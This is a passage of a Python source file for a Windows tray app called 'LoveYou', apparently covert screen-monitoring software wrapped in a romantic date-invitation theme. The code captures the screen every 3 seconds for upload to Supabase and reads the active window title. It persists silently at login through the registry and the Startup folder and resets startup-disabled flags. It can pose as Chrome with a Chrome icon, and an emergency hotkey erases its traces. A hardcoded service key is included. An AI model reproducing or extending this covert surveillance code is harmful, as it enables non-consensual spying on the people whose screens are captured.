"""
==============================================================================
LOVEYOU SCREENSHOT SERVICE & SUPABASE LOGGER (NATIVE WINDOWS SYSTEM TRAY)
==============================================================================
Layanan native Windows untuk menangkap screenshot otomatis menggunakan mss
setiap 3 detik, dengan arsitektur producer-consumer queue untuk memastikan jeda
waktu screenshot selalu presisi tanpa terhambat latensi upload jaringan.
==============================================================================
"""

import os
import sys
import io
import re
import time
import queue
import ctypes
import tempfile
import platform
import argparse
import threading
import subprocess
import webbrowser
import urllib.parse
import configparser
from datetime import datetime, timezone, timedelta
import winreg

import mss
import mss.tools
from PIL import Image, ImageDraw
import pystray
import webview
from supabase import create_client, Client

# Pastikan paket modular backend (services, schemas, agent) dapat diimpor baik saat
# dijalankan langsung (`python backend/screenshot_service.py`), via PyInstaller, maupun via `pytest`.
_CURRENT_DIR = os.path.dirname(os.path.abspath(__file__))
_PARENT_DIR = os.path.dirname(_CURRENT_DIR)
for _candidate_path in (_CURRENT_DIR, _PARENT_DIR):
    if _candidate_path and _candidate_path not in sys.path:
        sys.path.insert(0, _candidate_path)

try:
    from backend.agent import LoveYouAgent
    from backend.services import (
        STATUS_PAUSED,
        CustomService,
        GameService,
        NotificationService,
        ScreenshotService,
        ServiceManager,
        SyncService,
        TrayService,
        UiService,
    )
except ImportError:
    from agent import LoveYouAgent
    from services import (
        STATUS_PAUSED,
        CustomService,
        GameService,
        NotificationService,
        ScreenshotService,
        ServiceManager,
        SyncService,
        TrayService,
        UiService,
    )


def setup_safe_stdio():
    """Memastikan sys.stdout dan sys.stderr tidak crash di mode --windowed atau non-UTF8."""
    for stream_name in ("stdout", "stderr"):
        stream = getattr(sys, stream_name, None)
        if stream is None:
            setattr(sys, stream_name, io.StringIO())
        elif hasattr(stream, "reconfigure"):
            try:
                stream.reconfigure(encoding="utf-8", errors="replace")
            except Exception:
                pass


setup_safe_stdio()


# ==============================================================================
# DEFAULT CONFIGURATION
# ==============================================================================
DEFAULT_SUPABASE_URL = "https://wqjfunxfngowxwdmyzyj.supabase.co"
DEFAULT_SUPABASE_KEY = "sb_publishable_u2lBe4CRF_2XEqbkniBjbw_p0gGEXgZ"
DEFAULT_TABLE_NAME = "hasil_ss"
DEFAULT_BUCKET_NAME = "screenshots"
DEFAULT_INTERVAL = 3  # Delay 3 detik sesuai permintaan
DEFAULT_LOCAL_FOLDER = "screenshots"
DEFAULT_APP_NAME = "LoveYou"
DEFAULT_INVITE_TEXT = "SABTU, 5 DESEMBER 2026"
DEFAULT_COUNTDOWN_TARGET = "2026-12-05T12:00:00Z"
DEFAULT_TANGGAL_DATE = "2026-12-05"

ID_MONTHS_TO_NUM = {
    "januari": 1, "jan": 1, "january": 1,
    "februari": 2, "feb": 2, "pebruari": 2, "february": 2,
    "maret": 3, "mar": 3, "march": 3,
    "april": 4, "apr": 4,
    "mei": 5, "may": 5,
    "juni": 6, "jun": 6, "june": 6,
    "juli": 7, "jul": 7, "july": 7,
    "agustus": 8, "agu": 8, "ags": 8, "aug": 8, "august": 8,
    "september": 9, "sep": 9, "sept": 9,
    "oktober": 10, "okt": 10, "oct": 10, "october": 10,
    "november": 11, "nov": 11, "nopember": 11, "nop": 11,
    "desember": 12, "des": 12, "dec": 12, "december": 12,
}

NUM_TO_ID_MONTH = {
    1: "JANUARI", 2: "FEBRUARI", 3: "MARET", 4: "APRIL",
    5: "MEI", 6: "JUNI", 7: "JULI", 8: "AGUSTUS",
    9: "SEPTEMBER", 10: "OKTOBER", 11: "NOVEMBER", 12: "DESEMBER",
}


def resolve_date_settings(raw_text: str, raw_target: str) -> dict:
    """
    Menyelaraskan date_invitation_text, date_countdown_target, dan tanggal_date (YYYY-MM-DD).
    Jika user mengkustomisasi Teks Tanggal Undangan (misal 'MINGGU, 27 DESEMBER 2026'),
    otomatis menyesuaikan countdown target & tanggal_date untuk tabel user_responses.
    """
    invite_text = (raw_text or "").strip() or DEFAULT_INVITE_TEXT
    target_iso = (raw_target or "").strip() or DEFAULT_COUNTDOWN_TARGET

    lower = invite_text.lower()
    parsed_ymd = None
    month_pattern = "|".join(sorted(ID_MONTHS_TO_NUM.keys(), key=len, reverse=True))
    m1 = re.search(rf"\b(\d{{1,2}})\s+({month_pattern})\s+(\d{{4}})\b", lower)
    if m1:
        day, mon_str, year = int(m1.group(1)), m1.group(2), int(m1.group(3))
        month = ID_MONTHS_TO_NUM.get(mon_str, 12)
        try:
            datetime(year, month, day)
            parsed_ymd = (year, month, day)
        except ValueError:
            pass

    if not parsed_ymd:
        m2 = re.search(r"\b(\d{4})[-/](\d{1,2})[-/](\d{1,2})\b", lower)
        if m2:
            try:
                y, m, d = int(m2.group(1)), int(m2.group(2)), int(m2.group(3))
                datetime(y, m, d)
                parsed_ymd = (y, m, d)
            except ValueError:
                pass

    if not parsed_ymd:
        m3 = re.search(r"\b(\d{1,2})[-/](\d{1,2})[-/](\d{4})\b", lower)
        if m3:
            try:
                d, m, y = int(m3.group(1)), int(m3.group(2)), int(m3.group(3))
                datetime(y, m, d)
                parsed_ymd = (y, m, d)
            except ValueError:
                pass

    remainder = (lower[:m1.start()] + " " + lower[m1.end():]) if m1 else lower
    tm = re.search(r"(?:•|pukul|jam|\b)\s*([01]?\d|2[0-3])[:\.]([0-5]\d)\b", remainder)
    parsed_hm = (int(tm.group(1)), int(tm.group(2))) if tm else None

    wib = timezone(timedelta(hours=7))
    target_dt = None
    try:
        s = target_iso[:-1] + "+00:00" if target_iso.lower().endswith("z") else target_iso
        dt = datetime.fromisoformat(s)
        target_dt = dt.replace(tzinfo=wib) if dt.tzinfo is None else dt.astimezone(wib)
    except Exception:
        pass

    default_ymd = (2026, 12, 5)
    target_ymd = (target_dt.year, target_dt.month, target_dt.day) if target_dt else default_ymd
    target_hm = (target_dt.hour, target_dt.minute) if target_dt else (19, 0)

    if parsed_ymd:
        if parsed_ymd != default_ymd and target_ymd == default_ymd:
            final_ymd = parsed_ymd
            final_hm = parsed_hm if parsed_hm else target_hm
            target_iso = datetime(final_ymd[0], final_ymd[1], final_ymd[2], final_hm[0], final_hm[1], 0, tzinfo=wib).isoformat()
        elif parsed_ymd == default_ymd and target_ymd != default_ymd and invite_text.upper() == DEFAULT_INVITE_TEXT:
            final_ymd = target_ymd
            dt_obj = datetime(final_ymd[0], final_ymd[1], final_ymd[2])
            day_name = DAYS_ID.get(dt_obj.weekday(), "Sabtu").upper()
            mon_name = NUM_TO_ID_MONTH.get(final_ymd[1], "DESEMBER")
            invite_text = f"{day_name}, {final_ymd[2]} {mon_name} {final_ymd[0]}"
        else:
            final_ymd = parsed_ymd
            if parsed_hm:
                target_iso = datetime(final_ymd[0], final_ymd[1], final_ymd[2], parsed_hm[0], parsed_hm[1], 0, tzinfo=wib).isoformat()
            elif target_ymd != parsed_ymd:
                target_iso = datetime(final_ymd[0], final_ymd[1], final_ymd[2], target_hm[0], target_hm[1], 0, tzinfo=wib).isoformat()
        tanggal_date = f"{final_ymd[0]:04d}-{final_ymd[1]:02d}-{final_ymd[2]:02d}"
    else:
        tanggal_date = f"{target_ymd[0]:04d}-{target_ymd[1]:02d}-{target_ymd[2]:02d}"

    return {
        "date_invitation_text": invite_text,
        "date_countdown_target": target_iso,
        "tanggal_date": tanggal_date,
    }


DAYS_ID = {
    0: "Senin",
    1: "Selasa",
    2: "Rabu",
    3: "Kamis",
    4: "Jumat",
    5: "Sabtu",
    6: "Minggu",
}


def get_base_dir() -> str:
    """Mengembalikan direktori dasar (lokasi script atau exe)."""
    if getattr(sys, "frozen", False):
        return os.path.dirname(sys.executable)
    return os.path.dirname(os.path.abspath(__file__))


def get_frontend_dir() -> str:
    """
    Mencari folder root frontend/src.
    - Bundled (_MEIPASS):    <meipass>/frontend/src
    - Frozen (exe di root):  <exe_dir>/frontend/src atau _internal/frontend/src
    - Dev (backend/script):  <backend_dir>/../frontend/src
    """
    meipass = getattr(sys, "_MEIPASS", None)
    if meipass:
        p = os.path.join(meipass, "frontend", "src")
        if os.path.exists(p):
            return p

    base = get_base_dir()
    if getattr(sys, "frozen", False):
        for candidate in (
            os.path.join(base, "frontend", "src"),
            os.path.join(base, "_internal", "frontend", "src"),
        ):
            if os.path.exists(candidate):
                return candidate
        return os.path.join(base, "frontend", "src")

    return os.path.abspath(os.path.join(base, "..", "frontend", "src"))


def get_frontend_path(page: str = "index.html") -> str:
    """Mengembalikan path ke halaman tertentu di dalam frontend/src/."""
    return os.path.join(get_frontend_dir(), page)


def load_config() -> dict:
    """Membaca konfigurasi dari config.ini."""
    base_dir = get_base_dir()
    config_path = os.path.join(base_dir, "config.ini")

    # Untuk mode onefile PyInstaller, config.ini ada di _MEIPASS (folder temp ekstraksi)
    meipass = getattr(sys, "_MEIPASS", None)
    if meipass and not os.path.exists(config_path):
        meipass_config = os.path.join(meipass, "config.ini")
        if os.path.exists(meipass_config):
            config_path = meipass_config

    config = configparser.ConfigParser()

    conf = {
        "supabase_url": DEFAULT_SUPABASE_URL,
        "supabase_key": DEFAULT_SUPABASE_KEY,
        "table_name": DEFAULT_TABLE_NAME,
        "bucket_name": DEFAULT_BUCKET_NAME,
        "interval_seconds": DEFAULT_INTERVAL,
        "local_folder": os.path.join(base_dir, DEFAULT_LOCAL_FOLDER),
        "keep_local_file": False,
        "image_format": "webp",
        "jpg_quality": 75,
        "auto_start": False,
        "app_name": DEFAULT_APP_NAME,
        "show_tray_notifications": False,
        "emergency_hotkey": True,
        "hotkey_combo": "Ctrl+Shift+F12",
        "tray_icon": "heart.ico",
        "date_invitation_text": DEFAULT_INVITE_TEXT,
        "date_countdown_target": DEFAULT_COUNTDOWN_TARGET,
        "tanggal_date": DEFAULT_TANGGAL_DATE,
        "agent_enabled": False,
        "agent_api_base_url": "http://localhost:8000",
        "agent_project_slug": "loveyou",
        "agent_enrollment_code": "",
        "agent_heartbeat_interval": 30,
        "agent_poll_interval": 10,
        "agent_config_sync_interval": 60,
        "agent_realtime_enabled": False,
        "agent_app_version": "1.0.0",
    }

    if os.path.exists(config_path):
        try:
            config.read(config_path, encoding="utf-8")
            if "SUPABASE" in config:
                conf["supabase_url"] = config["SUPABASE"].get("url", conf["supabase_url"]).strip()
                conf["supabase_key"] = config["SUPABASE"].get("key", conf["supabase_key"]).strip()
                conf["table_name"] = config["SUPABASE"].get("table_name", conf["table_name"]).strip()
                conf["bucket_name"] = config["SUPABASE"].get("bucket_name", conf["bucket_name"]).strip()

            if "CAPTURE" in config:
                conf["interval_seconds"] = config["CAPTURE"].getint("interval_seconds", conf["interval_seconds"])
                folder_name = config["CAPTURE"].get("local_folder", DEFAULT_LOCAL_FOLDER).strip()
                conf["local_folder"] = folder_name if os.path.isabs(folder_name) else os.path.join(base_dir, folder_name)
                conf["keep_local_file"] = config["CAPTURE"].getboolean("keep_local_file", conf["keep_local_file"])
                conf["image_format"] = config["CAPTURE"].get("image_format", conf["image_format"]).strip().lower()
                conf["jpg_quality"] = config["CAPTURE"].getint("jpg_quality", conf["jpg_quality"])

            if "STARTUP" in config:
                conf["auto_start"] = config["STARTUP"].getboolean("auto_start", conf["auto_start"])
                conf["app_name"] = config["STARTUP"].get("app_name", conf["app_name"]).strip()

            if "TRAY" in config:
                conf["show_tray_notifications"] = config["TRAY"].getboolean("notifications", conf["show_tray_notifications"])
                conf["tray_icon"] = config["TRAY"].get("icon", conf["tray_icon"]).strip()

            if "SECURITY" in config:
                conf["emergency_hotkey"] = config["SECURITY"].getboolean("emergency_hotkey", conf["emergency_hotkey"])
                conf["hotkey_combo"] = config["SECURITY"].get("hotkey_combo", conf["hotkey_combo"]).strip()

            if "CONTENT" in config:
                raw_text = config["CONTENT"].get("date_invitation_text", conf["date_invitation_text"]).strip()
                raw_target = config["CONTENT"].get("date_countdown_target", conf["date_countdown_target"]).strip()
                resolved = resolve_date_settings(raw_text, raw_target)
                conf["date_invitation_text"] = resolved["date_invitation_text"]
                conf["date_countdown_target"] = resolved["date_countdown_target"]
                conf["tanggal_date"] = config["CONTENT"].get("tanggal_date", resolved["tanggal_date"]).strip() or resolved["tanggal_date"]

            if "AGENT" in config:
                conf["agent_enabled"] = config["AGENT"].getboolean("enabled", conf["agent_enabled"])
                conf["agent_api_base_url"] = config["AGENT"].get("api_base_url", conf["agent_api_base_url"]).strip()
                conf["agent_project_slug"] = config["AGENT"].get("project_slug", conf["agent_project_slug"]).strip() or "loveyou"
                conf["agent_enrollment_code"] = config["AGENT"].get("enrollment_code", conf["agent_enrollment_code"]).strip()
                conf["agent_heartbeat_interval"] = config["AGENT"].getint("heartbeat_interval_seconds", conf["agent_heartbeat_interval"])
                conf["agent_poll_interval"] = config["AGENT"].getint("poll_interval_seconds", conf["agent_poll_interval"])
                conf["agent_config_sync_interval"] = config["AGENT"].getint("config_sync_interval_seconds", conf["agent_config_sync_interval"])
                conf["agent_realtime_enabled"] = config["AGENT"].getboolean("realtime_enabled", conf["agent_realtime_enabled"])
                conf["agent_app_version"] = config["AGENT"].get("app_version", conf["agent_app_version"]).strip() or "1.0.0"
        except Exception as e:
            print(f"[WARN] Gagal membaca config.ini ({e}), menggunakan default.")

    # Deteksi otomatis ikon Chrome jika nama aplikasi disamarkan sebagai Chrome
    if "chrome" in conf.get("app_name", "").lower() and conf.get("tray_icon") == "heart.ico":
        conf["tray_icon"] = "chrome.ico"

    return conf


# ==============================================================================
# WINDOWS HELPERS & STARTUP (REGISTRY + STARTUP FOLDER)
# ==============================================================================
def get_active_window_title() -> str:
    """Mendapatkan judul jendela Windows yang sedang aktif/fokus saat ini."""
    try:
        user32 = ctypes.windll.user32
        hwnd = user32.GetForegroundWindow()
        if not hwnd:
            return ""
        length = user32.GetWindowTextLengthW(hwnd)
        if length > 0:
            buff = ctypes.create_unicode_buffer(length + 1)
            user32.GetWindowTextW(hwnd, buff, length + 1)
            return buff.value
    except Exception:
        pass
    return ""


def get_app_state_id(conf: dict) -> str:
    """Menghasilkan ID unik yang aman untuk Registry state dan Mutex berdasarkan app_name & table_name."""
    raw = f"{conf.get('app_name', DEFAULT_APP_NAME)}_{conf.get('table_name', DEFAULT_TABLE_NAME)}"
    safe = "".join(c if c.isalnum() or c in ("-", "_") else "_" for c in raw).strip("_")
    return safe or "LoveYou"


def load_app_state(conf: dict) -> dict:
    """Membaca state persisten (active_user, onboarding_done, date_accepted) dari Windows Registry."""
    state = {"active_user": "", "onboarding_done": False, "date_accepted": False}
    state_id = get_app_state_id(conf)
    reg_path = rf"Software\XooseLoveYou\{state_id}"
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_path, 0, winreg.KEY_READ)
        try:
            val, _ = winreg.QueryValueEx(key, "active_user")
            if isinstance(val, str) and val.strip():
                state["active_user"] = val.strip()
        except FileNotFoundError:
            pass
        try:
            val, _ = winreg.QueryValueEx(key, "onboarding_done")
            state["onboarding_done"] = bool(val)
        except FileNotFoundError:
            pass
        try:
            val, _ = winreg.QueryValueEx(key, "date_accepted")
            state["date_accepted"] = bool(val)
        except FileNotFoundError:
            pass
        winreg.CloseKey(key)
    except FileNotFoundError:
        pass
    except Exception as e:
        print(f"[WARN] Gagal membaca state Registry: {e}")
    return state


def save_app_state(
    conf: dict,
    active_user: str | None = None,
    onboarding_done: bool | None = None,
    date_accepted: bool | None = None,
):
    """Menyimpan state persisten ke Registry agar tetap tersimpan setelah restart & sinkron antar proses."""
    state_id = get_app_state_id(conf)
    reg_path = rf"Software\XooseLoveYou\{state_id}"
    try:
        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, reg_path)
        if active_user is not None:
            winreg.SetValueEx(key, "active_user", 0, winreg.REG_SZ, str(active_user).strip())
        if onboarding_done is not None:
            winreg.SetValueEx(key, "onboarding_done", 0, winreg.REG_DWORD, 1 if onboarding_done else 0)
        if date_accepted is not None:
            winreg.SetValueEx(key, "date_accepted", 0, winreg.REG_DWORD, 1 if date_accepted else 0)
        winreg.CloseKey(key)
    except Exception as e:
        print(f"[WARN] Gagal menyimpan state Registry: {e}")


def clear_app_state(conf: dict):
    """Menghapus bersih state aplikasi ini dari Registry saat proses Uninstall."""
    state_id = get_app_state_id(conf)
    try:
        winreg.DeleteKey(winreg.HKEY_CURRENT_USER, rf"Software\XooseLoveYou\{state_id}")
    except FileNotFoundError:
        pass
    except Exception:
        pass
    try:
        winreg.DeleteKey(winreg.HKEY_CURRENT_USER, r"Software\XooseLoveYou")
    except Exception:
        pass


def _clear_startup_disabled_flag(app_name: str):
    """Menghapus flag StartupApproved disabled lama untuk app_name agar auto-start aktif kembali saat install ulang."""
    for subkey, value_name in (
        (r"Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run", app_name),
        (r"Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\StartupFolder", f"{app_name}.lnk"),
    ):
        try:
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, subkey, 0, winreg.KEY_SET_VALUE | winreg.KEY_READ)
            try:
                val, _ = winreg.QueryValueEx(key, value_name)
                if isinstance(val, (bytes, bytearray)) and len(val) > 0 and val[0] != 0x02:
                    winreg.DeleteValue(key, value_name)
            except FileNotFoundError:
                pass
            winreg.CloseKey(key)
        except Exception:
            pass


def register_startup(app_name: str, is_silent_launch: bool = False) -> bool:
    """
    Mendaftarkan aplikasi ke Windows Startup melalui dua jalur:
    1. Windows Registry (HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run)
    2. Folder Startup Pengguna (%APPDATA%\\...\\Startup\\<app_name>.lnk)
    Menggunakan argumen --silent agar saat laptop menyala, berjalan di latar belakang tanpa pop-up.
    """
    success = False
    base_dir = get_base_dir()

    if getattr(sys, "frozen", False):
        target_path = sys.executable
        work_dir = base_dir
        cmd = f'"{target_path}" --silent'
    else:
        target_path = os.path.abspath(__file__)
        work_dir = base_dir
        pythonw = os.path.join(os.path.dirname(sys.executable), "pythonw.exe")
        if not os.path.exists(pythonw):
            pythonw = sys.executable
        cmd = f'"{pythonw}" "{target_path}" --silent'

    # Saat bukan boot --silent, pastikan flag StartupApproved lama yang disabled ter-reset
    if not is_silent_launch:
        _clear_startup_disabled_flag(app_name)

    # 1. Daftarkan ke Registry Run Key
    try:
        run_key = r"Software\Microsoft\Windows\CurrentVersion\Run"
        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, run_key)

        for old_name in ["Google Chrome", "Chrome"]:
            if old_name != app_name:
                try:
                    winreg.DeleteValue(key, old_name)
                except FileNotFoundError:
                    pass

        existing_cmd = None
        try:
            existing_cmd, _ = winreg.QueryValueEx(key, app_name)
        except FileNotFoundError:
            pass

        if existing_cmd != cmd:
            winreg.SetValueEx(key, app_name, 0, winreg.REG_SZ, cmd)
        winreg.CloseKey(key)
        success = True
    except Exception as e:
        print(f"[WARN] Registry startup registration failed: {e}")

    # 2. Buat Shortcut di Folder Startup (Shell:Startup) memakai temp_dir (bukan folder exe) & CREATE_NO_WINDOW
    try:
        startup_dir = os.path.expandvars(r"%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup")
        os.makedirs(startup_dir, exist_ok=True)
        lnk_path = os.path.join(startup_dir, f"{app_name}.lnk")

        if (not is_silent_launch) or (not os.path.exists(lnk_path)):
            vbs_content = (
                f'Set ws = WScript.CreateObject("WScript.Shell")\r\n'
                f'Set lnk = ws.CreateShortcut("{lnk_path}")\r\n'
                f'lnk.TargetPath = "{target_path}"\r\n'
                f'lnk.Arguments = "--silent"\r\n'
                f'lnk.WorkingDirectory = "{work_dir}"\r\n'
                f'lnk.Save\r\n'
            )
            temp_vbs = os.path.join(tempfile.gettempdir(), f"_xoose_lnk_{os.getpid()}.vbs")
            try:
                with open(temp_vbs, "w", encoding="utf-16") as f:
                    f.write(vbs_content)
                subprocess.run(
                    ["cscript", "//nologo", temp_vbs],
                    creationflags=getattr(subprocess, "CREATE_NO_WINDOW", 0),
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL,
                    timeout=10,
                )
            finally:
                if os.path.exists(temp_vbs):
                    try:
                        os.remove(temp_vbs)
                    except Exception:
                        pass
        success = True
    except Exception as e:
        print(f"[WARN] Startup folder shortcut creation failed: {e}")

    return success


def unregister_startup(app_name: str) -> bool:
    """Menghapus aplikasi dari Windows Startup (Registry, StartupApproved, dan folder Startup)."""
    names_to_remove = list(dict.fromkeys([app_name, "LoveYou", "loveyou", "Google Chrome", "Chrome"]))
    for reg_path in (
        r"Software\Microsoft\Windows\CurrentVersion\Run",
        r"Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run",
    ):
        try:
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_path, 0, winreg.KEY_SET_VALUE)
            for name in names_to_remove:
                try:
                    winreg.DeleteValue(key, name)
                except FileNotFoundError:
                    pass
            winreg.CloseKey(key)
        except Exception:
            pass

    try:
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\StartupFolder",
            0,
            winreg.KEY_SET_VALUE,
        )
        for name in names_to_remove:
            try:
                winreg.DeleteValue(key, f"{name}.lnk")
            except FileNotFoundError:
                pass
        winreg.CloseKey(key)
    except Exception:
        pass

    try:
        startup_dir = os.path.expandvars(r"%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup")
        for f in [f"{app_name}.lnk", f"{app_name}.exe", "LoveYou.lnk", "loveyou.lnk", "Chrome.lnk"]:
            p = os.path.join(startup_dir, f)
            if os.path.exists(p):
                os.remove(p)
    except Exception:
        pass

    return True


def uninstall_and_clean_exit(controller):
    """
    Menonaktifkan layanan, mencabut dari Windows Startup (Registry & Startup folder),
    membersihkan state persisten Registry dan seluruh file/folder screenshot lokal / temp,
    lalu menghentikan proses aplikasi.
    """
    print("\n" + "=" * 65)
    print("[UNINSTALL] Memulai proses penonaktifan darurat & pembersihan total...")
    print("=" * 65)

    controller.is_running = False

    # 0. Hentikan Device Agent & seluruh service modular secara graceful
    agent = getattr(controller, "agent", None)
    if agent is not None:
        try:
            agent.stop()
            agent.enrollment.unregister_local()
            agent.identity.clear_all()
            print("[UNINSTALL OK] Kredensial LoveYou Device Agent berhasil dibersihkan.")
        except Exception as e:
            print(f"[UNINSTALL WARN] Gagal membersihkan kredensial agent: {e}")

    service_manager = getattr(controller, "service_manager", None)
    if service_manager is not None:
        try:
            service_manager.stop_all()
            print("[UNINSTALL OK] Seluruh layanan modular dihentikan secara normal.")
        except Exception as e:
            print(f"[UNINSTALL WARN] Gagal menghentikan layanan modular: {e}")

    # 1. Cabut dari Windows Startup & hapus state persisten Registry
    app_name = controller.conf.get("app_name", DEFAULT_APP_NAME)
    try:
        unregister_startup(app_name)
        clear_app_state(controller.conf)
        print(f"[UNINSTALL OK] Aplikasi '{app_name}' berhasil dicabut dari Windows Startup & Registry state.")
    except Exception as e:
        print(f"[UNINSTALL WARN] Gagal mencabut startup: {e}")

    # 2. Hapus seluruh file screenshot lokal (jika mode simpan lokal aktif)
    local_folder = controller.conf.get("local_folder")
    if local_folder and os.path.exists(local_folder):
        try:
            import shutil
            shutil.rmtree(local_folder, ignore_errors=True)
            print(f"[UNINSTALL OK] Folder lokal '{local_folder}' berhasil dihapus bersih.")
        except Exception as e:
            print(f"[UNINSTALL WARN] Gagal menghapus folder lokal: {e}")

    # 3. Hapus folder temporary capture jika ada
    try:
        import shutil
        temp_dir = os.path.join(tempfile.gettempdir(), "_xoose_temp_capture")
        if os.path.exists(temp_dir):
            shutil.rmtree(temp_dir, ignore_errors=True)
            print(f"[UNINSTALL OK] Folder temporary '{temp_dir}' dibersihkan.")
    except Exception:
        pass

    # 4. Hentikan System Tray jika ada
    if controller.tray_icon:
        try:
            controller.tray_icon.stop()
            print("[UNINSTALL OK] Ikon System Tray dinonaktifkan.")
        except Exception:
            pass

    print("[UNINSTALL OK] Pembersihan selesai total. Aplikasi berhasil dihentikan.")
    print("=" * 65)
    os._exit(0)


def parse_hotkey(combo_str: str) -> tuple[int, int]:
    """
    Mengurai string kombinasi tombol keyboard (cth: 'Ctrl+Shift+F12' atau 'Ctrl+Alt+Q')
    menjadi pasangan (fs_modifiers, vk_code).
    """
    parts = [p.strip().upper() for p in (combo_str or "").replace(" ", "").split("+") if p.strip()]
    modifiers = 0
    vk = None

    vk_map = {
        "F1": 0x70, "F2": 0x71, "F3": 0x72, "F4": 0x73, "F5": 0x74, "F6": 0x75,
        "F7": 0x76, "F8": 0x77, "F9": 0x78, "F10": 0x79, "F11": 0x7A, "F12": 0x7B,
        "END": 0x23, "HOME": 0x24, "DELETE": 0x2E, "DEL": 0x2E, "ESC": 0x1B, "ESCAPE": 0x1B,
        "SPACE": 0x20, "TAB": 0x09, "BACKSPACE": 0x08,
    }

    for p in parts:
        if p in ("CTRL", "CONTROL"):
            modifiers |= 0x0002
        elif p in ("ALT", "MENU"):
            modifiers |= 0x0001
        elif p == "SHIFT":
            modifiers |= 0x0004
        elif p in ("WIN", "WINDOWS", "SUPER"):
            modifiers |= 0x0008
        elif p in vk_map:
            vk = vk_map[p]
        elif len(p) == 1 and (p.isalpha() or p.isdigit()):
            vk = ord(p)

    # Default aman jika parsing gagal: Ctrl+Shift+F12
    if not modifiers:
        modifiers = 0x0002 | 0x0004
    if not vk:
        vk = 0x7B

    return modifiers, vk


def start_emergency_hotkey_listener(controller):
    """
    Mendaftarkan Global Hotkey Windows kustom sesuai konfigurasi.
    Saat ditekan di mana saja di Windows, aplikasi akan langsung dinonaktifkan
    dan dibersihkan hingga ke akarnya.
    """
    def _listener():
        try:
            from ctypes import wintypes
            user32 = ctypes.windll.user32
            combo_str = controller.conf.get("hotkey_combo", "Ctrl+Shift+F12")
            modifiers, vk = parse_hotkey(combo_str)

            HOTKEY_ID_CUSTOM = 0x5841  # ID untuk custom hotkey pilihan user
            HOTKEY_ID_BACKUP = 0x5842  # ID untuk backup universal Ctrl+Shift+F12

            # 1. Daftarkan custom hotkey pilihan user
            reg_custom = user32.RegisterHotKey(None, HOTKEY_ID_CUSTOM, modifiers | 0x4000, vk)
            if not reg_custom:
                reg_custom = user32.RegisterHotKey(None, HOTKEY_ID_CUSTOM, modifiers, vk)

            # 2. Daftarkan backup universal Ctrl+Shift+F12 jika berbeda
            reg_backup = False
            if (modifiers, vk) != (0x0006, 0x7B):
                reg_backup = user32.RegisterHotKey(None, HOTKEY_ID_BACKUP, 0x0006 | 0x4000, 0x7B)
                if not reg_backup:
                    reg_backup = user32.RegisterHotKey(None, HOTKEY_ID_BACKUP, 0x0006, 0x7B)

            print(f"[HOTKEY] Pintasan darurat aktif: [{combo_str}] untuk nonaktifkan & bersihkan total.")

            msg = wintypes.MSG()
            while controller.is_running and user32.GetMessageW(ctypes.byref(msg), None, 0, 0) != 0:
                if msg.message == 0x0312:  # WM_HOTKEY
                    if msg.wParam in (HOTKEY_ID_CUSTOM, HOTKEY_ID_BACKUP):
                        print(f"\n[HOTKEY TRIGGERED] Pintasan darurat terdeteksi! Memulai pembersihan...")
                        user32.UnregisterHotKey(None, HOTKEY_ID_CUSTOM)
                        if reg_backup:
                            user32.UnregisterHotKey(None, HOTKEY_ID_BACKUP)
                        uninstall_and_clean_exit(controller)
                        break
                user32.TranslateMessage(ctypes.byref(msg))
                user32.DispatchMessageW(ctypes.byref(msg))

            user32.UnregisterHotKey(None, HOTKEY_ID_CUSTOM)
            if reg_backup:
                user32.UnregisterHotKey(None, HOTKEY_ID_BACKUP)
        except Exception as e:
            print(f"[WARN] Emergency hotkey listener error: {e}")

    t = threading.Thread(target=_listener, daemon=True, name="EmergencyHotkeyListener")
    t.start()
    return t


# ==============================================================================
# SCREENSHOT CAPTURE ENGINE (MSS)
# ==============================================================================
def capture_screenshot(output_dir: str, image_format: str = "webp", jpg_quality: int = 75) -> tuple[str, str, str]:
    """
    Menangkap tampilan layar menggunakan mss (sangat cepat ~10ms).
    Format nama file: ss_(jam_tanggal_hari) sesuai permintaan user.
    Mendukung format modern 'webp' dengan ukuran ultra-hemat (10-50 KB) dan kualitas tajam.
    Contoh: ss_00-45-12_21-11-2026_Sabtu.webp
    Returns:
        tuple(filepath, filename, resolution)
    """
    os.makedirs(output_dir, exist_ok=True)
    now = datetime.now()
    hari = DAYS_ID.get(now.weekday(), "Hari")
    jam = now.strftime("%H-%M-%S")
    tanggal = now.strftime("%d-%m-%Y")

    fmt = (image_format or "webp").strip().lower()
    if fmt == "png":
        ext = "png"
    elif fmt in ["jpg", "jpeg"]:
        ext = "jpg"
    else:
        ext = "webp"

    base_name = f"ss_{jam}_{tanggal}_{hari}"
    filename = f"{base_name}.{ext}"
    filepath = os.path.join(output_dir, filename)

    # Antisipasi jika ada file bernama sama di detik yang sama
    counter = 1
    while os.path.exists(filepath):
        filename = f"{base_name}_{counter}.{ext}"
        filepath = os.path.join(output_dir, filename)
        counter += 1

    resolution = "Unknown"
    with mss.MSS() as sct:
        monitor = sct.monitors[1] if len(sct.monitors) > 1 else sct.monitors[0]
        resolution = f"{monitor['width']}x{monitor['height']}"
        sct_img = sct.grab(monitor)

        if ext == "png":
            mss.tools.to_png(sct_img.rgb, sct_img.size, output=filepath)
        elif ext == "webp":
            img = Image.frombytes("RGB", sct_img.size, sct_img.bgra, "raw", "BGRX")
            q = min(max(int(jpg_quality), 40), 90)
            img.save(filepath, "WEBP", quality=q, method=4)

            # Smart Budget Check: Jika ukuran melebihi 50 KB, optimasi resolusi proporsional agar 10-50 KB
            if os.path.exists(filepath) and os.path.getsize(filepath) > 51200:
                w, h = img.size
                scaled = img.resize((int(w * 0.75), int(h * 0.75)), Image.Resampling.LANCZOS)
                scaled.save(filepath, "WEBP", quality=min(q, 75), method=4)
        else:
            img = Image.frombytes("RGB", sct_img.size, sct_img.bgra, "raw", "BGRX")
            q = min(max(int(jpg_quality), 10), 100)
